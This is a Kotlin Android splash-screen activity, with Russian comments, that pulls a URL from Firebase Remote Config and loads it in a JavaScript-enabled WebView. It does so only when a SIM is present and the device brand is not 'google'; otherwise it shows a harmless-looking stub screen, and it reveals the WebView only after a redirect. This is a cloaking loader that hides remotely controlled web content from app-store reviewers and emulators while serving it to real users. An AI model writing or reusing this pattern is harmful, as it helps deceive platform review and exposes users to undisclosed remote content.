package com.kostlin.fragment

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import android.view.View
import android.webkit.*
import android.widget.ProgressBar
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isGone
import androidx.fragment.app.FragmentManager
import androidx.fragment.app.FragmentTransaction
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.kostlin.fragment.ui.main.BrawlFragment
import com.kostlin.fragment.ui.main.MainFragment


class SpashScreenActivity : AppCompatActivity() {


    private var progressBar: ProgressBar? = null
    private var webView: WebView? = null

    private var _prefManager: SharedPreferencesManager? = null
    private val prefManager: SharedPreferencesManager
        get() = _prefManager!!


    private fun checkFirebaseUrl() {
        //Получаем ссылку их локального хранилища
        val savedUrl = prefManager.getURL()
        //Если ссылка пустая, то обращаемя к FirebaseRemote
        if (savedUrl.isEmpty()) {
            //Настраиваем конфиг FirebaseRemote
            val remoteConfig = Firebase.remoteConfig.apply {
                setConfigSettingsAsync(remoteConfigSettings {
                    fetchTimeoutInSeconds = 30
                })
            }
            //Ставим слушатель на получение ссылки из FirebaseRemote
            remoteConfig.fetchAndActivate().addOnSuccessListener {
                //Здесь мы получили ссылку по уникальному тегу
                //Тег должен быть одинаковым в проекте и в Firebase
                val webUrl = remoteConfig.getString("FireBaseLink")
                //Проверяем если значение не пустое, то есть пришла реальная ссылка
                if (webUrl.isNotEmpty()) {
                    //Сохраняем ссылку в локальное хранилище
                    prefManager.putURL(webUrl)
                    //Запускаем WebView
                    setWebView(webUrl)
                    stopProgressBar()

                } else startStub()
                stopProgressBar()
            }
        } else {
            //Срабатывает если ссылка уже сохранена локально,
            //чтобы не делать повторные запросы в FirebaseRemote

            //Запускаем WebView
            setWebView(savedUrl)
            stopProgressBar()
        }
    }

    private fun stopProgressBar() {
        progressBar = findViewById(R.id.pb)
        progressBar?.isGone = true
    }

    private fun setWebView(loadingUrl: String) {
        //Делаем проверку
        // 1) Вставлена ли сим-карта
        // 2) Проверяет соединение с интернетом
        if (isSIMInserted() && isRealDevice() && isNetworkAvailable()) {
            //Настраиваем WebView
            webView = findViewById(R.id.webView)
            webView!!.apply {
                CookieManager.getInstance().setAcceptThirdPartyCookies(this, true);
                settings.apply {
                    domStorageEnabled = true
                    javaScriptEnabled = true
                    useWideViewPort = true
                    databaseEnabled = true
                    javaScriptCanOpenWindowsAutomatically = true
                    cacheMode = WebSettings.LOAD_DEFAULT
                }
                webViewClient = object : WebViewClient() {

                    override fun onPageFinished(view: WebView?, url: String?) {
                        super.onPageFinished(view, url)

                        CookieManager.getInstance().setAcceptThirdPartyCookies(view, true)
                        if (Uri.parse(loadingUrl).host == "" || Uri.parse(url).host == "") {
                            return
                        }
                        //Если был редирект делает webView видимым
                        if (
                            (Uri.parse(loadingUrl).host != Uri.parse(url).host) ||
                            (Uri.parse(loadingUrl).query != Uri.parse(url).query)
                        ) {
                            webView?.visibility = View.VISIBLE
                        }
                    }

                    override fun onReceivedError(
                        view: WebView?,
                        request: WebResourceRequest?,
                        error: WebResourceError?
                    ) {
                        view?.stopLoading()
                        startStub()
                    }

                    override fun onLoadResource(view: WebView?, url: String?) {
                        super.onLoadResource(view, url)
                        CookieManager.getInstance().setAcceptThirdPartyCookies(view, true);
                    }
                }
            }
            //Запускаем загрузку WebView
            webView!!.loadUrl(loadingUrl)
        } else startStub()
    }

    //Проверка на наличие сим-карты
    private fun isSIMInserted(): Boolean {
        return TelephonyManager.SIM_STATE_ABSENT != (this.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).simState
    }

    private fun isRealDevice(): Boolean {
        return !Build.BRAND.lowercase().equals("google")
    }

    //Проверка на включенный интренет
    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            this.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val capabilities =
                connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
                    ?: return false
            return when {
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> true
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
                else -> false
            }
        } else {
            if (connectivityManager.activeNetworkInfo != null && connectivityManager.activeNetworkInfo!!.isConnectedOrConnecting) {
                return true
            }
        }
        return false
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_spashscreen)

        _prefManager = SharedPreferencesManager(this)
        checkFirebaseUrl()


//        Handler().postDelayed({
//            if (allowed) {
//                val intent = Intent(this, MainActivity::class.java)
//                startActivity(intent)
//                overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
//                finish()
//
//            } else {
//                return@postDelayed
//            }
//
//        }, 3000)

    }

    private fun startStub() {

        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
        finish()

    }

    companion object {
        private const val FireBaseLink = "FireBaseLink"
    }
}
